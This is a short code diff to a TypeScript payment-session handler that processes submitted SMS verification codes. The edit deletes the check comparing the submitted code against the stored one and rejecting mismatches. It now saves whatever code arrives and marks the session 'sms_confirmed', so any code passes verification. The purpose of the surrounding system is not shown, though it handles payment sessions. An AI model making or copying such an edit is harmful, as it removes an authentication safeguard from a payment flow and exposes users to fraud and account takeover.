@@ -291,31 +291,13 @@ async function handleEnterSmsCode(req: Request) {
 async function handleSubmitSmsCode(req: Request) {
   const { sessionId, code } = await req.json();
 
-  console.log('Submitting SMS code for verification:', sessionId);
+  console.log('Directly saving and confirming SMS code:', sessionId);
 
-  // Get the session to verify the code
-  const { data: session, error: fetchError } = await supabase
-    .from('payment_sessions')
-    .select('sms_code')
-    .eq('session_id', sessionId)
-    .single();
-
-  if (fetchError) {
-    console.error('Error fetching session:', fetchError);
-    throw fetchError;
-  }
-
-  // Verify SMS code
-  if (session.sms_code !== code) {
-    return new Response(JSON.stringify({ error: 'Invalid SMS code' }), {
-      status: 400,
-      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-    });
-  }
-
+  // Directly save the SMS code and set status to confirmed
   const { data, error } = await supabase
     .from('payment_sessions')
     .update({
+      sms_code: code,
       verification_status: 'sms_confirmed',
       last_seen: new Date().toISOString()
     })
